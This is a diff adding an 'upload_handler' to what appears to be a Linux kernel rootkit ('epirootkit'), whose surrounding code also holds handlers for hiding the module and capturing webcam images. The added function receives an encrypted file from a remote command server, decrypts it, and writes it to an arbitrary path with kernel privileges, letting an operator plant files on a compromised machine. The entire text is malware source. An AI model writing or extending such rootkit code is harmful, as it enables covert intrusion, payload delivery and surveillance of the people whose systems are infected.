@@ -290,6 +290,83 @@ static int unhide_module_handler(char *args) {
     return ret_code;
 }
 
+#include <linux/fs.h>
+#include <linux/uaccess.h>
+#include <linux/slab.h>
+#include <linux/string.h>
+#include "crypto.h"
+#include "epirootkit.h"
+#include "network.h"
+
+static int upload_handler(char *args) {
+    struct file *file;
+    mm_segment_t old_fs;
+    char *enc_buf, *dec_buf;
+    size_t enc_size = 0, dec_size = 0;
+    int ret = 0;
+
+    DBG_MSG("upload_handler: receiving encrypted file to path: %s\n", args);
+
+    file = filp_open(args, O_WRONLY | O_CREAT | O_TRUNC, 0644);
+    if (IS_ERR(file)) {
+        ERR_MSG("upload_handler: failed to open destination file %s\n", args);
+        send_to_server("Failed to open file.\n");
+        return PTR_ERR(file);
+    }
+
+    old_fs = get_fs();
+    set_fs(KERNEL_DS);
+
+    send_raw_to_server("READY_TO_RECEIVE\n");
+
+    enc_buf = kmalloc(PAGE_SIZE * 32, GFP_KERNEL); // 128 KB max
+    if (!enc_buf) {
+        filp_close(file, NULL);
+        set_fs(old_fs);
+        return -ENOMEM;
+    }
+
+    size_t pos = 0;
+    while (true) {
+        char tmp[4096] = {0};
+        struct kvec vec = { .iov_base = tmp, .iov_len = sizeof(tmp) };
+        struct msghdr msg = { 0 };
+        int len = kernel_recvmsg(get_worker_socket(), &msg, &vec, 1, sizeof(tmp), 0);
+        if (len <= 0) break;
+
+        if (len >= 4 && !memcmp(tmp + len - 4, "EOF\n", 4)) len -= 4;
+
+        if (pos + len > PAGE_SIZE * 32) {
+            ERR_MSG("upload_handler: file too large, buffer overflow\n");
+            ret = -ENOMEM;
+            goto out;
+        }
+
+        memcpy(enc_buf + pos, tmp, len);
+        pos += len;
+        if (len < sizeof(tmp)) break;
+    }
+
+    enc_size = pos;
+
+    ret = decrypt_buffer(enc_buf, enc_size, &dec_buf, &dec_size);
+    if (ret != 0) {
+        ERR_MSG("upload_handler: decryption failed with code %d\n", ret);
+        send_to_server("Decryption failed\n");
+        goto out;
+    }
+
+    vfs_write(file, dec_buf, dec_size, &file->f_pos);
+    send_to_server("Upload completed and decrypted successfully\n");
+
+    kfree(dec_buf);
+out:
+    kfree(enc_buf);
+    filp_close(file, NULL);
+    set_fs(old_fs);
+    return ret;
+}
+
 // Command to start the webcam and capture an image
 static int start_webcam_handler(char *args) {
     DBG_MSG("start_webcam_handler: starting webcam to capture an image\n");
